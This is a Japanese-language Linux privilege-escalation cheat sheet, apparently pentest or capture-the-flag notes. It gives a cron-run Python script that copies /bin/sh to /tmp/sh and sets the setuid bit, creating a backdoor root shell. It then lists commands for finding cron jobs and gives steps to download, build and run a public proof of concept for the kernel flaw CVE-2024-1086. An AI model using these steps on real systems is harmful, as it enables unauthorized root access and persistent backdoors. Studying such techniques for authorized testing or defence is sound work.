
## Cron Job
### Pythonで書かれているファイルに付与する例

以下のPythonコードを実行した後、`./sh`を実行します。

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh ')
except:
        sys.exit()
```

このコードは、`/bin/sh`を`/tmp/sh`にコピーし、`setuid`ビットを設定することで、`/tmp/sh`を実行するときに所有者の権限で実行されるようにします。

---

### Cronジョブの検出

Cronジョブを確認するために、以下のコマンドを使用します。

#### `/etc/crontab`ファイルの内容を表示
```bash
cat /etc/crontab
```

#### 現在のユーザーのCronジョブを表示
```bash
crontab -l
```

#### pspyツールの利用
`pspy`は、Linux上でリアルタイムに発生しているアクティビティを監視するための便利なツールです。

---
### 既知の脆弱性を利用する
#### CVE-2024-1086
CVE-2024-1086に関する詳細情報は以下のリンクから確認できます。
##### 脆弱性の概要
[CVE-2024-1086](https://www.cve.org/CVERecord?id=CVE-2024-1086)

---

##### musl-gccのインストール

以下の手順で`musl-gcc`をインストールします。`musl-gcc`は、Musl libc向けのGCCコンパイラです。

```bash
sudo apt update
sudo apt install musl-tools
```

---

##### PoCのインストール

次に、CVE-2024-1086のPoC（概念実証）をインストールします。

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

---

##### PoCの実行

インストール後、以下のコマンドでPoCを実行します。

```bash
./exploit
```

